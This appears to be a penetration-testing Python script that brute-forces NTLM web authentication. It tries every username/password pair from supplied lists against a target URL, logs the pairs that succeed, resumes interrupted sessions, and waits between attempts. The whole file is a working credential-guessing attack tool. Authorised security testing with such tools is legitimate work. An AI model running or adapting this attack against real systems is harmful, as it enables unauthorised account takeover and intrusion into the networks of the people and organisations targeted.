#! /usr/bin/env python3

import requests
import difflib
import sys
import os
import time
from requests_ntlm2 import HttpNtlmAuth
from optparse import OptionParser
from utils import messages
from pathlib import Path

def sendrequest(url, username, password, domain, log):
    auth=HttpNtlmAuth("{}\\{}".format(domain, username), password)
    resp = requests.get(url, auth=auth)

    if resp.status_code == 200:
        log.success("VALID Credentials FOUND: {}\\{}: {}".format(domain, username, password))
    else:
        log.error("INVALID Credentials: {}\\{}: {}".format(domain, username, password), False)
   
def main():
    log = messages.message()
    usage = "Usage: %prog [options]"
    parser = OptionParser(usage=usage)
    parser.add_option("-t", "--targeturl", dest="targeturl", help="This URL (with complete URI) to the target site requesting authentication.")
    parser.add_option("-u", "--userfile", dest="userfile", help="Required. A list of users to use for authentication.")
    parser.add_option("-p", "--passfile", dest="passfile", help="Required. A list of passwords to use for authentication attempts.")
    parser.add_option("-v", "--verbose", action="store_true", default=False, help="Verbose output. Show each individual test.")
    parser.add_option("-d", "--domain", help="NTLM domain. Required if using NTLM authentication.")
    parser.add_option("-o", "--outputdir", help="Output directory. Path where brute force attempts are stored.")
    (options, args) = parser.parse_args()

    # Error parsing
    #
    errors = []
    errorfound = False
    if options.userfile is None:
        errors.append("RTFMException. -u is Required.")
        errorfound = True
    else:
        p = Path(options.userfile)
        if p.exists() == False:
            errors.append("Userfile does not exist. Double check path.")
            errorfound = True

    if options.passfile is None:
        errors.append("RTFMException. -p is Required.")
        errorfound = True
    else:
        p = Path(options.passfile)
        if p.exists() == False:
            errors.append("Passfile does not exist. Double check path.")
            errorfound = True

    if options.targeturl is None:
        errors.append("RTFMException. -t is Required.")
        errorfound = True

    if options.domain is None:
        errors.append("RTFMException. -d is Required.")
        errorfound = True

    if options.outputdir is None:
        errors.append("RTFMException. -o is Required.")
        errorfound = True
    else:
        p = Path(options.outputdir)
        if p.exists() == False:
            os.makedirs(options.outputdir)

    if errorfound:
        for msg in errors:
            log.error(msg, False)
        sys.exit(1)


    ## Main block
    #
    userfile = open(options.userfile, 'r').readlines() 
    passfile = open(options.passfile , 'r').readlines() 
    path_completed = options.outputdir + "/completed_passwords.txt"
    master_list = []
    session_completed = None

    if os.path.exists(path_completed):
        session_completed = open(path_completed, 'r').readlines()
        completed_pwds = open(path_completed, 'a')
    else:
        # First run 
        completed_pwds = open(path_completed, 'w')
        master_list = passfile

    if session_completed is not None:
        log.warn("Session file discovered. Resuming from last entry.")
        diffs = difflib.ndiff(passfile, session_completed)
        for i in diffs:
            if '- ' in i[:2]:
                master_list.append(i.lstrip('- ').rstrip('\n'))

    for user in userfile:
        user = user.strip('\n')
        for pwd in master_list:
            pwd = pwd.strip('\n')
            sendrequest(options.targeturl, user, pwd, options.domain, log)
            completed_pwds.write(pwd + '\n')
            completed_pwds.flush()
            time.sleep(3)


if __name__ == '__main__':
    main()
